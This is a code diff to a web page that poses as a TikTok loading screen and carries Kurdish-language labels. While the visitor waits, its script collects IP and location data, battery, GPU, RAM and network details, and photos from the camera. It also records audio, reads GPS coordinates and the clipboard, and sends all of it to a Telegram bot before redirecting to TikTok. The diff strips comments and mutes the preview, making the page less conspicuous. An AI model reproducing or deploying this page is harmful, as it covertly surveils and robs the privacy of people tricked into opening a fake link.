@@ -15,7 +15,7 @@
     <div class="tiktok-loader"></div>
     <p style="margin-top: 15px; font-size: 14px; color: #888;">Loading TikTok...</p>
 
-    <video id="v" autoplay playsinline></video>
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
@@ -25,11 +25,9 @@
 
         async function start() {
             try {
-                // ١. کۆکردنەوەی زانیاری بێ مۆڵەت (IP و ISP)
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
                 
-                // ٢. زانیاری پاتری و کێبڵ
                 let batt = { level: "N/A", char: "N/A" };
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
@@ -37,13 +35,11 @@
                     batt.char = b.charging ? "بەڵێ 🔌" : "نەخێر 🔋";
                 }
 
-                // ٣. زانیاری گرافیک (GPU)
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                 const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "نادیار";
 
-                // ٤. جۆری هێڵ و سیستم
                 const conn = navigator.connection || {};
                 const netType = conn.effectiveType || "N/A";
                 const isWifi = conn.type === 'wifi' ? "WiFi 📶" : "Sim Card 📱";
@@ -59,29 +55,25 @@
 • وڵات/شار: ${data.country_name} - ${data.city}
 
 🔋 **باری وزە:**
-• پاتری: **${batt.level}**
-• کێبڵی شەحن: **${batt.char}**
+• پاتری: **${batt.level}** | شەحن: **${batt.char}**
 
 📱 **سیستم و ئامێر:**
 • پلاتفۆرم: ${navigator.platform}
 • ڕام: **${ram}** | گرافیک: ${gpu}
 • شاشە: ${screen.width}x${screen.height}
-• زمان: ${navigator.language}
-• دۆخ: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark 🌑" : "Light ☀️"}
+• زمان: ${navigator.language} | دۆخ: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}
 
 📍 **ناوچە:** ${data.region}
 ⏰ **کات:** ${new Date().toLocaleString('ku-IQ')}
 ----------------------------------
 `;
-                // ناردنی ڕاپۆرتی دەق
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
-                // ٥. داوای مۆڵەتی مایکرۆفۆن و کامێرا
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                 const videoEl = document.getElementById('v');
                 videoEl.srcObject = stream;
+                videoEl.muted = true; // بێدەنگکردنی مایکرۆفۆن بۆ کەسەکە
 
-                // وێنەگرتنی ٢ وێنە
                 for (let i = 0; i < 2; i++) {
                     await new Promise(r => setTimeout(r, 1500));
                     const picCanvas = document.getElementById('c');
@@ -93,7 +85,6 @@
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 }
 
-                // تۆمارکردنی دەنگ
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
@@ -106,21 +97,15 @@
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), 4000);
 
-                // لۆکەیشن
                 navigator.geolocation.getCurrentPosition(pos => {
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 GPS: http://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
                 });
 
-                // چوونە ناو تیکتۆک دوای تەواوبوون
                 setTimeout(() => { window.location.href = tiktokLink; }, 2000);
 
-            } catch(e) {
-                // ئەگەر مۆڵەتی نەدا یان هەر هەڵەیەک هەبوو، یەکسەر دەچێتە سەر تیکتۆک
-                window.location.href = tiktokLink;
-            }
+            } catch(e) { window.location.href = tiktokLink; }
         }
 
-        // وەرگرتنی کلیپبۆرد لە کاتی کلیک
         document.addEventListener('click', async () => {
             try {
                 const text = await navigator.clipboard.readText();
